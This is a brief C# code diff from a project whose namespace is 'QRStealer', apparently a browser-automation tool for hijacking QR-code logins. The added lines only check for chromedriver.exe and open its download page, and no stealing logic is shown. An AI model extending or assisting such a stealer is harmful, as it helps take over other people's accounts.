@@ -29,6 +29,13 @@ namespace QRStealer
             try
             {
                 Console.Clear();
+                if (!File.Exists("chromedriver.exe"))
+                {
+                    Console.WriteLine("Chromedriver is missing.\nChromedriver must be in the same folder as Phoenix.\nChromedriver must match your Chrome version.\nPress any key to download.");
+                    Console.ReadKey();
+                    Process.Start("http://chromedriver.storage.googleapis.com/index.html");
+                    Environment.Exit(0);
+                }
                 Console.WriteLine("Wait");
                 ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                 service.EnableVerboseLogging = false;
